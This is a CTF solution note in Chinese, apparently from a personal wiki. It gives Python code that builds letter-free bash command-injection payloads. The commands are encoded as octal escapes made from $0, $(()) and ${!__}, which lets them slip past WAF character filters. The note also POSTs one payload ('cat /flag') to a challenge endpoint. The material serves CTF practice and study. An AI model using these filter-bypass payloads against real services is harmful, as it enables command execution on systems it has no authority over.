tags:: CTF/Shell/利用进制转换构造无字母payload, CTF/Shell/WAF绕过

- # 1&2
	- ```python
	  
	  def zero_str():
	      return "$0"
	  
	  def num(n: int):
	      return str(n)
	  
	  def string(s: str):
	      return "$'" + "".join(
	          ["\\" + num(int(oct(ord(c))[2:]))
	              for c in s]
	      ) + "'"
	  
	  def payload(cmd):
	      return "{zero}<<<{zero}\\<\\<\\<{cmd}".format(
	          zero = zero_str(),
	          cmd = string(cmd)
	      )
	  
	  p = string("/getflag")
	  print(p)
	  ```
	- 把p交上去就行，注意转义
	- 参考[[CTFWEB/Shell/bash构造无字母payload]]
- # 5
	- 数字：参考 [[CTFWEB/WP/CTFShow/web57]]
	- bash str: 先在前方设置变量`__=$(())`，然后使用`${!__}`
	- 字符串：
		- ```python
		  def string_by_bin(s: str):
		      return "$\\'" + "".join(["\\\\" + number(int(oct(ord(c))[2:])) for c in s]) + "\\'"
		  ```
	- payload生成：
		- ```python
		  # payload = shell_payload.number(1)
		  
		  def number(n):
		      assert isinstance(n, int)
		      if n == 0:
		          return "$(())"
		      elif n == -1:
		          return "$((~$(())))"
		      elif n < 0:
		          return "$(({}))".format(
		              "".join(
		                  "$(({}))".format(number(-1))
		                  for _ in range(-n)
		              )
		          ) 
		      elif n > 0:
		          return "$((~{}))".format(
		              number(-n-1)
		          )
		  
		  def string_by_bin(s: str):
		      return "$\\'" + "".join(["\\\\" + number(int(oct(ord(c))[2:])) for c in s]) + "\\'"
		  
		  
		  def string(s: str):
		      """生成一个payload, 其经过两次解析后得到原有的字符串
		      经过一次解析：
		          "$\\'" -> "$'"
		          "\\\\" -> "\\"
		          数字payload -> 实际的数字
		          整个payload变成`$'\000\000'`的形式
		  
		      Args:
		          s (str): payload的值
		  
		      Returns:
		          str: payload
		      """
		      return string_by_bin(s)
		  
		  
		  def generate_payload(cmd):
		      return "{bash_str}<<<{bash_str}\\<\\<\\<{cmd}".format(bash_str=bash_str(), cmd=string(cmd))
		  
		  bash_str = lambda : "${!__}"
		  
		  payload = "__=$(())&&" + generate_payload("cat /flag")
		  print(payload)
		  r = base_post(url, data = {
		      "ctf_show": payload
		  })
		  print(r.text)
		  ```